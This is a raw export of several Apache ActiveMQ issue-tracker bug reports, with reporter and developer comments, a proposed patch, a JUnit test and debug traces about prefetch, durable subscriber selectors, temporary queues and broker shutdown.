The addition of https://issues.apache.org/jira/browse/AMQ-3003 provides an alternative way of avoiding duplicate submission to the DLQ in the scenario described in this issue.;;;","11/Jul/11 09:50;gtully;new DeadLetterStrategy enableAudit attribute introduced in http://svn.apache.org/viewvc?rev=1145092&view=rev;;;","11/Jul/11 12:36;larhvi;I moved the messages using the admin interface (conf/jetty.xml).

>> Any chance you have a test case?
This happens almost every time a message is moved back to the DLQ the 2nd time. Seems a little bit random though..

Using the new setting in #1145092 we can avoid message loss now, but shouldn't that be the default? I mean, if people are bothered by dups in the DLQ wouldn't it be better for them to enable the audit?

Btw, when will this fix be released?;;;","23/Aug/11 18:23;carfey;>> new DeadLetterStrategy enableAudit attribute introduced in http://svn.apache.org/viewvc?rev=1145092&view=rev

Gary, will this be configurable on the individualDeadLetterStrategy/sharedDeadLetterStrategy element or will it be derived from a policyEntry setting? ;;;","23/Aug/11 19:11;gtully;on a dead letter strategy, eg: {code}<policyEntry .."">
            <deadLetterStrategy>
              <individualDeadLetterStrategy queuePrefix=""Test.DLQ."" processNonPersistent=""true"" enableAudit=""false"" />
            </deadLetterStrategy>{code};;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Durable subscribers receives nothing when reconnecting with a prefetch size less than the number of messages that don't match a message selector,AMQ-2580,12482587,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,philliph,philliph,22/Jan/10 14:46,23/Jul/10 15:39,14/Jul/23 05:43,23/Jul/10 15:39,5.3.0,,,,,5.4.0,,,Selector,,,,3,,,,,,,,,"1. Create a connection factory with a message prefetch size of PREFETCH_SIZE.
2. Create a durable subscriber to a Topic with a message selector of ""a=X"". 
3. Disconnect.
4. More than PREFETCH_SIZE messages are then put onto the Topic with a string property ""a=Y"".
5. Just one message is put onto the Topic with string property ""a=X"".
6. The durable subscriber connects again but it does not get the message with string property ""a=X"". In fact, it gets nothing.

It appears that upon reconnecting, the message selector is not respected when retrieving the message from storage.

I've got a unit test to demonstrate this plus a proposed fix.

{code}
### Eclipse Workspace Patch 1.0
#P activemq
Index: activemq-core/src/main/java/org/apache/activemq/store/kahadaptor/KahaTopicReferenceStore.java
===================================================================
--- activemq-core/src/main/java/org/apache/activemq/store/kahadaptor/KahaTopicReferenceStore.java       (revision 900353)
+++ activemq-core/src/main/java/org/apache/activemq/store/kahadaptor/KahaTopicReferenceStore.java       (working copy)
@@ -306,7 +306,7 @@
                                 count++;
                                 container.setBatchEntry(msg.getMessageId(), entry);
                             } else {
-                                break;
+                                //break;
                             }
                         } else {
                             container.reset();
Index: activemq-core/src/main/java/org/apache/activemq/store/amq/RecoveryListenerAdapter.java
===================================================================
--- activemq-core/src/main/java/org/apache/activemq/store/amq/RecoveryListenerAdapter.java      (revision 900353)
+++ activemq-core/src/main/java/org/apache/activemq/store/amq/RecoveryListenerAdapter.java      (working copy)
@@ -46,10 +46,11 @@
     
     public boolean recoverMessage(Message message) throws Exception {
         if (listener.hasSpace()) {
-            listener.recoverMessage(message);
-            lastRecovered = message.getMessageId();
-            count++;
-            return true;
+            if (listener.recoverMessage(message)) {
+                lastRecovered = message.getMessageId();
+                count++;
+                return true;
+            }
         }
         return false;
     }
Index: activemq-pool/src/test/java/org/apache/activemq/pool/PrefetchTest.java
===================================================================
--- activemq-pool/src/test/java/org/apache/activemq/pool/PrefetchTest.java      (revision 0)
+++ activemq-pool/src/test/java/org/apache/activemq/pool/PrefetchTest.java      (revision 0)
@@ -0,0 +1,174 @@
+package org.apache.activemq.pool;
+
+import java.io.File;
+
+import javax.jms.JMSException;
+import javax.jms.MessageConsumer;
+import javax.jms.MessageProducer;
+import javax.jms.Session;
+import javax.jms.TextMessage;
+import javax.jms.Topic;
+import javax.jms.TopicConnection;
+import javax.jms.TopicSession;
+
+import junit.framework.TestCase;
+
+import org.apache.activemq.ActiveMQConnectionFactory;
+import org.apache.activemq.ActiveMQPrefetchPolicy;
+import org.apache.activemq.broker.BrokerService;
+import org.apache.activemq.store.PersistenceAdapter;
+
+public class PrefetchTest extends TestCase {
+
+       private static final String TOPIC_NAME = ""topicName"";
+       private static final String CLIENT_ID = ""client_id"";
+       private static final String textOfSelectedMsg = ""good_message"";
+
+       protected TopicConnection connection;
+
+       private Topic topic;
+       private Session session;
+       private MessageProducer producer;
+       private PooledConnectionFactory connectionFactory;
+       private TopicConnection topicConnection;
+       private String bindAddress;
+       private BrokerService service;
+
+       protected void setUp() throws Exception {
+               bindAddress = ""tcp://localhost:61616"";
+               super.setUp();
+               initDurableBroker();
+               initConnectionFactory();
+               initTopic();
+
+       }
+
+       protected void tearDown() throws Exception {
+           shutdownClient();
+               connectionFactory.stop();
+               service.stop();
+               super.tearDown();
+       }
+
+       private void initConnection() throws JMSException {
+           System.out.println(""Initializing connection"");
+               connection = (TopicConnection) connectionFactory.createConnection(); 
+               connection.start();
+       }
+
+    public void testTopicIsDurableSmokeTest() throws Exception {
+        
+       initClient();
+       MessageConsumer consumer = createMessageConsumer();
+       System.out.println(""Consuming message"");
+       assertNull(consumer.receive(1));
+       shutdownClient();
+       consumer.close();
+    
+       sendMessages();
+       shutdownClient();
+    
+       initClient();
+       consumer = createMessageConsumer();
+    
+       System.out.println(""Consuming message"");
+       TextMessage answer1 = (TextMessage)consumer.receive(1000);
+       assertNotNull(answer1);
+    
+       consumer.close();
+    }
+    
+    private MessageConsumer createMessageConsumer() throws JMSException {
+        System.out.println(""creating durable subscriber"");
+       return session.createDurableSubscriber(topic, 
+               TOPIC_NAME, 
+               ""name='value'"", 
+               false);
+    }
+
+       private void initClient() throws JMSException {
+           System.out.println(""Initializing client"");
+           
+               initConnection();
+       initSession();
+       }
+
+       private void shutdownClient()
+                       throws JMSException {
+           System.out.println(""Closing session and connection"");
+        session.close();
+        connection.close();
+        session = null;
+        connection = null;
+       }
+
+       private void sendMessages()
+                       throws JMSException {
+           initConnection();
+
+               initSession();
+
+               System.out.println(""Creating producer"");
+               producer = session.createProducer(topic);
+
+               sendMessageThatFailsSelection();
+        
+               sendMessage(textOfSelectedMsg, ""value"");
+       }
+
+       private void initSession() throws JMSException {
+           System.out.println(""Initializing session"");
+               session = connection.createTopicSession(false, Session.AUTO_ACKNOWLEDGE);
+       }
+
+       private void sendMessageThatFailsSelection() throws JMSException {
+               for (int i = 0 ; i < 5 ; i++) {
+                       String textOfNotSelectedMsg = ""Msg_"" + i;
+                       sendMessage(textOfNotSelectedMsg, ""not_value"");
+                       System.out.println(""#"");
+               }
+       }
+
+       private void sendMessage(
+                       String msgText,
+                       String propertyValue) throws JMSException {
+           System.out.println(""Creating message: "" + msgText);
+               TextMessage messageToSelect = session.createTextMessage(msgText);
+        messageToSelect.setStringProperty(""name"", propertyValue);
+        System.out.println(""Sending message"");
+               producer.send(messageToSelect);
+       }
+
+       protected void initConnectionFactory() {
+               ActiveMQConnectionFactory activeMqConnectionFactory = createActiveMqConnectionFactory();
+               connectionFactory = new PooledConnectionFactory(activeMqConnectionFactory);
+       }
+
+
+       private ActiveMQConnectionFactory createActiveMqConnectionFactory() {
+               ActiveMQConnectionFactory activeMqConnectionFactory = new ActiveMQConnectionFactory();
+        ActiveMQPrefetchPolicy prefetchPolicy = new ActiveMQPrefetchPolicy();
+        prefetchPolicy.setDurableTopicPrefetch(2);
+               activeMqConnectionFactory.setPrefetchPolicy(prefetchPolicy );
+        activeMqConnectionFactory.setClientID(CLIENT_ID);
+               return activeMqConnectionFactory;
+       }
+
+       private void initDurableBroker() throws Exception {
+               service = new BrokerService();
+               PersistenceAdapter persistenceAdaptor = service.getPersistenceAdapter();
+               File file = new File(""phills_durable_dir"");
+               persistenceAdaptor.setDirectory(file);
+               service.setTransportConnectorURIs(new String[] { bindAddress } );
+               service.setPersistent(true);
+               service.setUseJmx(true);
+               service.start();
+
+       }
+
+       private void initTopic() throws JMSException {
+               topicConnection = (TopicConnection) connectionFactory.createConnection();
+               TopicSession topicSession = topicConnection.createTopicSession(false, Session.AUTO_ACKNOWLEDGE);
+               topic = topicSession.createTopic(TOPIC_NAME);
+       }
+}
{code}","phillip:~ henryp$ uname -a
Darwin phillip.fritz.box 9.8.0 Darwin Kernel Version 9.8.0: Wed Jul 15 16:55:01 PDT 2009; root:xnu-1228.15.4~1/RELEASE_I386 i386 i386
phillip:~ henryp$ java -version
java version ""1.5.0_20""
Java(TM) 2 Runtime Environment, Standard Edition (build 1.5.0_20-b02-315)
Java HotSpot(TM) Client VM (build 1.5.0_20-141, mixed mode, sharing)",cgsmithe,cpa199,daggerrz,wangyin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/10 10:46;philliph;selector_patch_and_test.zip;https://issues.apache.org/jira/secure/attachment/12461599/selector_patch_and_test.zip",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74885,,,Fri Jul 23 15:39:27 UTC 2010,,,,,,,Patch Available,,,,"0|i0rq3b:",159871,,,,,,,,,,,,,,,,,,,,,"23/Jan/10 10:46;philliph;A test to demonstrate the problem and a proposed patch.;;;","25/Jan/10 16:09;gtully;thanks for the test and the patch. 
I wonder does your test work with the jdbc or kahadb store? If it does that would help validate the changes;;;","26/Jan/10 14:40;wangyin;It seems the patch is only for kaha store.
I use the jdbc store and have not found any solution yet.
So I have to give up using the message selector.

;;;","19/May/10 08:59;cpa199;Is there any plan to resolve this issue? This is a causing us problems too.;;;","19/May/10 10:14;gtully;please vote for this issue so we can gauge interest. I will try to get to this for 5.4;;;","23/Jul/10 15:39;gtully;resolved in 967134 - patch was great, test case was great, thanks. completed the impl for JDBC and kahaDB;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failover with async rollback of message audit can lead to over eager duplicate suppression (auto acking) and apparent missing messages,AMQ-2573,12483190,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,19/Jan/10 12:46,20/Jan/10 16:56,14/Jul/23 05:43,20/Jan/10 16:53,5.3.0,,,,,5.3.1,5.4.0,,Broker,,,,0,,,,,,,,,"with multiple unordered message consumers on a connection and failover with default prefetch recovery processing can lead to incorrect duplicate detection.
Duplicates are expected as all unacked messages will be redelivered on recovery. An active consumer may have unconsumed messages which need to be rolled back in the message audit. currently this rollback is occurring at an indeterminate time w.r.t to future dispatch.
given consumer 1 has unconsumed messages 0-10, consumer 2 11-20 etc.. all need to be rolled back prior to recovery of consumer 3 which may get any message in the range 0 - 20 delivered to it. Currently, rollbacks are done on the next delivery. 
All audit rollbacks need to be complete before any new delivery occurs on a recovered connection.

The result of over eager duplicate suppression is missing messages as the duplicates are auto acked.
Symptom: missing messages from a consumer perspective. With debug logging on {code}log4j.logger.org.apache.activemq.ActiveMQMessageConsumer=DEBUG{code} it is possible to catch the duplicate suppression. If your missing messages are in this set, you may have this problem.

workaround is to reduce the prefetch or even use a pull consumer, prefetch=0 such that unconsumed messages do not back up in the consumers dispatch queue pending receive() calls. With async listeners where the consumers can keep up with dispatch, this will not be a problem,",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74887,,,Wed Jan 20 16:53:17 UTC 2010,,,,,,,,,,,"0|i0rqlj:",159953,,,,,,,,,,,,,,,,,,,,,"20/Jan/10 16:53;gtully;fix committed to trunk in r901273, to 5.3.1 in r901274;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Timing issue on consumer close can lead to unconsumed messages being inadvertently marked as duplicates and not getting delivered  ,AMQ-2572,12483216,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,18/Jan/10 09:37,18/Jan/10 09:48,14/Jul/23 05:43,18/Jan/10 09:48,5.3.0,,,,,5.3.1,5.4.0,,Broker,,,,0,,,,,,,,,"Intermittent failure of activemq-core/src/test/java/org/apache/activemq/bugs/AMQ2102Test.java on Linux. Tracking this failure down, the problem of the hung test was missing messages, part of the prefetch that were delivered while the consumer was closing. A timing issue between the audit rollback of  unconsumed messages and the delivery of messages meant that some messages were not rolledback on close.
The use case has consumers that connect, consume a batch of 10 messages in individual transactions and close. These operations complete before the prefetch(1000) messages haven been delivered so there was concurrent delivery and closure happing which sometimes resulted in the problem.

The fix is to ensure the consumer is removed from the session and closed prior to doing the audit rollback on unconsumed messages.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74888,,,Mon Jan 18 09:48:10 UTC 2010,,,,,,,,,,,"0|i0rqc7:",159911,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"18/Jan/10 09:48;gtully;resolved in r900317;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Sender sometimes, involuntary, autocreates new, consumerless, TempQueue when trying to send to removed TempQueue.",AMQ-2571,12483233,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,rajdavies,nimos,nimos,15/Jan/10 21:45,03/Feb/10 08:04,14/Jul/23 05:43,03/Feb/10 08:04,4.1.1,,,,,5.4.0,,,Broker,,,,0,,,,,,,,,"Please see this post for discussion:
http://old.nabble.com/Problems-with-prefetch-and-TemporaryQueues-td27130529.html

I've tested this on 4.1.1, and briefly on 5.3.0 with the same result.

Scenario:
We have a server and a client. The client posts a message on the servers queue in order to subscribe to updates.
The server takes the reply address from the client and starts sending messages to a TempQueue created by the client.

When the client disconnects without notifying the server the following might happen:
1. The temporary queue is removed correctly when the client exits and closes its connection.

From here we have three scenarios:
2.a The server gets an exception the next time it tries to send a message to the TempQueue. This is wanted behaviour. It can then simply drop the ""subscription"".

2.b The server isn't notified in time and sends some messages before it gets the exception. Due to AutoCreateDestination being enabled one of these messages creates a new TempQueue with the same name as the one removed. It is of course missing a consumer.
But since the server gets the exception it will stop posting to the TempQueue. However, when the server closes its connection the TempQueue is not removed and is left lying around with no consumer.

2.c The server recreates the TempQueue in the same way as in 2.b, but here it never gets the exception for some reason. The server then has no idea that the client left and keeps pilling up messages on the TempQueue until the broker object hits its memory limit and everything connected to the broker halts.


I think there are three problems here:
1. The exception is not thrown every time.
2. When the TempQueue is recreated it is not removed when the server closes its connection. Also, the server gets an InvalidDestinationException if I, at server side, try to connect a consumer to the TempQueue. I guess this means that although the server is the initiator for the auto(re)creation it does not become the owner of the TempQueue. But who is then the owner? The broker itself?

3. Due to AutoCreateDestination being enabled by default for TempQueues, every post to a TempQueue could result in unknowingly creating a new TempQueue.


Suggestions
Setting AutoCreateDestination to false for TempQueues solves all three problems.
So exposing that option in an easily accessible way is important.

But even then, 1 and 2 should perhaps be examined separately.

I'll attach a JUnit test case for this. Unfortunately it is not 100% reliable in detecting the problem. One has to run it multiple times.
On my test setup it failed correctly 8 times out of 10 runs. You might be able to improve it.

Best Regards
Nimos","Ubuntu 9.10, P4 2.6 GHz HT, 3 GB RAM. ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Jan/10 21:49;nimos;TempQueueClosing.java;https://issues.apache.org/jira/secure/attachment/12461597/TempQueueClosing.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14630,,,Wed Feb 03 08:04:35 UTC 2010,,,,,,,,,,,"0|i0b9lz:",63669,,,,,,,,,,,,,,,,,,,,,"15/Jan/10 21:49;nimos;My attempt at writing a JUnit test for this.
I used JUnit 3 as it seemed to be the version used for the ActiveMQ in the source package.

Unfortunately since this seems to be a timing issue it might not be able to provoke the problem every time.
So it should be run multiple times to increase the chance of detecting the problem.

A warning might be in place, when it does succeed in provoking the error it will leave empty TempQueues lying around in the broker.

Regards
Nimos;;;","21/Jan/10 19:21;rajdavies;I know this issue was raised on 4.x - but also found on 5.3.0 - but I have not been able to reproduce after many tries on trunk. 
Added a test case - org.apache.activemq.bugs.AMQ2571 by SVN revision 901832;;;","22/Jan/10 10:21;nimos;I am still able to reproduce the problem on the 5.4 snapshot downloaded today from the ActiveMQ page:
http://activemq.apache.org/download.html
I ran the JUnit test case 10 times which resulted in 5 failures => 5 consumerless TempQueues lying around indefinetly (or actually until broker restart) in the broker. It might be that I have a slow computer, but the problem is there.

So I can't consider this fixed in the 5.4 version available at ActiveMQ homepage.

Best Regards
Simon;;;","22/Jan/10 10:22;nimos;Fixed misspelling (Settings -> Setting).;;;","26/Jan/10 23:21;rajdavies;luckily I have a slow laptop so have been able to validate it there;;;","03/Feb/10 08:04;rajdavies;Fixed by SVN revision 905926;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Embedded broker not shutting down cleanly because of lingering threads,AMQ-2568,12483264,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,rajdavies,fredmoore,fredmoore,14/Jan/10 15:35,21/May/10 02:20,14/Jul/23 05:43,20/May/10 12:03,5.3.0,,,,,5.4.0,,,Broker,JMX,,,0,,,,,,,,,"See also this thread: http://mail-archives.apache.org/mod_mbox/activemq-users/201001.mbox/%3C4E50CAAD-0600-46FB-B5D0-B623C21A362D@gmail.com%3E

See also this bug: http://issues.apache.org/activemq/browse/AMQ-1214

========================

we have a 5.3.0 embedded broker that refuses to shutdown cleanly because of lingering threads. A long time (dozens of seconds) after broker stop() is called,  these threads are still active:

* [ActiveMQ Scheduler] (Daemon) Group: main
* [Timer-0] (Daemon) Group: main

We discovered that [ActiveMQ Scheduler] can be closed adding this snippet to our code:

Scheduler scheduler = Scheduler.getInstance();
scheduler.shutdown();

After doing this the other lingering thread -- ""[Timer-0]"" -- did not go away, but at least we discovered that this timer is JMX related: if we disable JMX connector the timer disappear.",Windows,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74889,,,Fri May 21 02:20:22 UTC 2010,,,,,,,,,,,"0|i0rqgn:",159931,,,,,,,,,,,,,,,,,,,,,"15/Jan/10 19:59;rajdavies;There are a lot of references to the Scheuler - safer to defer this to 6.0;;;","20/May/10 12:03;rajdavies;Fixed by SVN revision 946600;;;","21/May/10 02:20;candy.chiu.ad;Is this related to the ""ActiveMQ Data File Writer"" thread not being cleaned up?  This thread is keeping the Java VM from exiting even after I called Scheduler.getInstance().shutdown().;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Zero Prefetch not working,AMQ-2567,12483209,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,rudolf_janz,rudolf_janz,14/Jan/10 14:26,28/Jan/10 10:49,14/Jul/23 05:43,20/Jan/10 16:45,5.3.0,,,,,5.3.1,5.4.0,,Broker,,,,0,,,,,,,,,"I have problems using the zero prefetch. The consumer starts prefetching messages after some receives. 
 
Our use case is, that we have a large computation which is split into smaller sub jobs. These jobs are sent via ActiveMQ to some processing nodes on different machines. The duration of jobs differs very much (10s to some minutes). The jobs are sent by decreasing estimated computation time. If one of the consumers which receives a large job prefetches some other jobs, these will be processed later. In the meantime the remaining consumers are idle, and the total computation time is much longer than necessary.
 
I have modified the existing ZeroPrefetchConsumerTest to test for the problem (I have removed the other test methods). 
 
Two consumers (C1  and C2) are instantiated. These messages are sent:
1,2,3,4,5,6,7,8,9
 
C1 reads 4 times, receives 1,2,3,4 -> this is correct
 
now C2 reads, it receives 8 not 5, which is the next message in the queue. The reason is, that C1 prefetched 5, 6, 7, that should not have happened.(sometimes C1 only prefetches 5,6)
 
The problem can be seen in the JMX Console as well, after a while, the first consumer has more than one dispatched message and the queue has an InflightCount of 3, although there are only two consumers!
 
The last version that we used was 4.1.1, that worked.","Unix/Windows, Java 1.6",kutzi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Jan/10 11:42;rudolf_janz;PrefetchSubscription.java;https://issues.apache.org/jira/secure/attachment/12461596/PrefetchSubscription.java","15/Jan/10 11:42;rudolf_janz;ZeroPrefetchConsumerTest.java;https://issues.apache.org/jira/secure/attachment/12461595/ZeroPrefetchConsumerTest.java","14/Jan/10 14:29;rudolf_janz;ZeroPrefetchConsumerTest.java;https://issues.apache.org/jira/secure/attachment/12461594/ZeroPrefetchConsumerTest.java",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74890,,,Thu Jan 28 10:49:07 UTC 2010,,,,,,,,,,,"0|i0rpx3:",159843,,,,,,,,,,,,,,,,,,,,,"14/Jan/10 14:29;rudolf_janz;Extended the test case to send more than one messages and listen and receiving on two consumers.;;;","14/Jan/10 16:28;rudolf_janz;Gary Tully wrote:
PrefetchSubscription and prefetchExtension on a deliveryAck in a transaction 
are areas that you need to look into to resolve this. Great that you have a 
simple junit test case.
---

You are right, prefetchExtension is the problem. I do not understand the reason for it. If I want prefetch 0, it should stay that way. Right now it is increased on each pull.

In acknowledge there is the following comment 
      if (context.isInTransaction()) {
              // extend prefetch window only if not a pulling consumer
                                if (getPrefetchSize() != 0) {
                                    prefetchExtension = Math.max(
                                            prefetchExtension, index );

In PrefetchSubscription::pullMessage it checks for prefetchSize 0 
        if (getPrefetchSize() == 0 && !isSlave()) {
            final long dispatchCounterBeforePull;
        	synchronized(this) {
        		prefetchExtension++;
        		dispatchCounterBeforePull = dispatchCounter;
        	}
;;;","14/Jan/10 17:42;gtully;so the prefetchExtension is the mechanism by which a message is dispatched to a consumer with prefetch=0. Each receive() sends a pull if there are no messages which increments the prefetchExtension so another message is dispatched. With a prefetch of 0, you should only be able to get one message at a time.

I think a deliveredAck may be the problem, a delivered ack uses the prefetchextension to ensure that within a transaction it is possible to read past the prefetch limit. If prefetch=0, a pulling consumer, it should not do that. Check to see if you are getting an ack with ackType=0.

if so, either the logic with a standard ack needs to be duplicated with a deliveredAck or the delivery ack needs to be suppressed on the consumer. ;;;","14/Jan/10 18:31;rudolf_janz;Ok, I unterstand now, what it is for.
Then I guess prefetchExtension should be reset to 0 again after the transaction? But it kept increasing.  

I will have a look at the Ack logic tomorrow.;;;","15/Jan/10 11:40;rudolf_janz;So I added a printout in the client (Expecting/Read) and in the PrefetchSubscribtion for all Acks,
C1/2 are the consumer n is the number of acked messaged. This is how it happens

Expecting Msg1
Read Msg1
C1: n:1 isDeliveredAck(Before): 1
C1: n:1 isDeliveredAck(After): 1
C1: n:1 isStandardAckXA(Before): 1
C1: n:1 isStandardAckXA(After): 1
Expecting Msg2
C1: n:1 isDeliveredAck(Before): *2*  This is wrong it should be in the same state as before the message 1, should have been 
C1: n:1 isDeliveredAck(After): 2
Read Msg2
C1: n:1 isStandardAckXA(Before): 2
C1: n:1 isStandardAckXA(After): 2
Expecting Msg3
C1: n:1 isDeliveredAck(Before): 2
C1: n:1 isDeliveredAck(After): 2
Read Msg3
C1: n:1 isStandardAckXA(Before): 2
C1: n:1 isStandardAckXA(After): 2
Expecting Msg4
Read Msg4
C1: n:1 isDeliveredAck(Before): 3
C1: n:1 isDeliveredAck(After): 3
C1: n:1 isStandardAckXA(Before): 3
C1: n:1 isStandardAckXA(After): 3
Expecting Msg5
Read Msg8
C2: n:1 isDeliveredAck(Before): 1
C2: n:1 isDeliveredAck(After): 1
C2: n:1 isStandardAckXA(Before): 1
C2: n:1 isStandardAckXA(After): 1

I think the problem is in the standardAck, this should decrement prefetchIndex. But I guess I am forgetting something (I extended receiving two messages in the transaction in the test case) 

{code}
            if (ack.isStandardAck()) {
                   ...
                            if (context.isInTransaction()) {
                                // extend prefetch window only if not a pulling
                                // consumer
                                System.out.println(prefix+""isStandardAckXA(Before): "" +prefetchExtension);
//RJ                                if (getPrefetchSize() != 0) {
//RJ                                   prefetchExtension = Math.max(prefetchExtension, index );
//RJ                               }
//RJ do the same as in the non transacted case
                                prefetchExtension = Math.max(0,    prefetchExtension - index);
                                System.out.println(prefix+""isStandardAckXA(After): "" +prefetchExtension);
                            } else {
                                System.out.println(prefix+""isStandardAck(Before): "" +prefetchExtension);
                                prefetchExtension = Math.max(0,
}}
                                        prefetchExtension - index);
                                System.out.println(prefix+""isStandardAck(After): "" +prefetchExtension);
                            }
{code}


Expecting Msg1
Read Msg1
C1: n:1 isDeliveredAck(Before): 1
C1: n:1 isDeliveredAck(After): 1
C1: n:1 isStandardAckXA(Before): 1
C1: n:1 isStandardAckXA(After): 0
Expecting Msg2
Read Msg2
C1: n:1 isDeliveredAck(Before): 1
C1: n:1 isDeliveredAck(After): 1
C1: n:1 isStandardAckXA(Before): 1
C1: n:1 isStandardAckXA(After): 0
Expecting Msg3
Read Msg3
C1: n:1 isDeliveredAck(Before): 1
C1: n:1 isDeliveredAck(After): 1
C1: n:1 isStandardAckXA(Before): 1
C1: n:1 isStandardAckXA(After): 0
Expecting Msg4
C1: n:1 isDeliveredAck(Before): 1
C1: n:1 isDeliveredAck(After): 1
Read Msg4
C1: n:1 isStandardAckXA(Before): 1
C1: n:1 isStandardAckXA(After): 0
Expecting Msg5
C2: n:1 isDeliveredAck(Before): 1
C2: n:1 isDeliveredAck(After): 1
Read Msg5
C2: n:1 isStandardAckXA(Before): 1
C2: n:1 isStandardAckXA(After): 0
Expecting Msg6
Read Msg6
Expecting Msg7
C1: n:1 isDeliveredAck(Before): 1
C1: n:1 isDeliveredAck(After): 1
Read Msg7
C1: n:1 isDeliveredAck(Before): 2
C1: n:1 isDeliveredAck(After): 2
C1: n:2 isStandardAckXA(Before): 2
C1: n:2 isStandardAckXA(After): 0
Expecting Msg8
Read Msg8
C2: n:1 isDeliveredAck(Before): 1
C2: n:1 isDeliveredAck(After): 1
C2: n:1 isStandardAckXA(Before): 1
C2: n:1 isStandardAckXA(After): 0

THis look ok to me now;;;","15/Jan/10 11:42;rudolf_janz;Here is the extended TestCase and the Subscribtion class including the printouts;;;","20/Jan/10 16:45;gtully;Thanks for the test case, debugging and fix. 
Fix with small modification applied to trunk in r901269 and 5.3.1 in r901271;;;","27/Jan/10 17:28;kutzi;Was the fix already released as part of a snapshot release available at https://repository.apache.org/content/repositories/snapshots/org/apache/activemq/ ?
Judging by the JAR file dates I would say no.

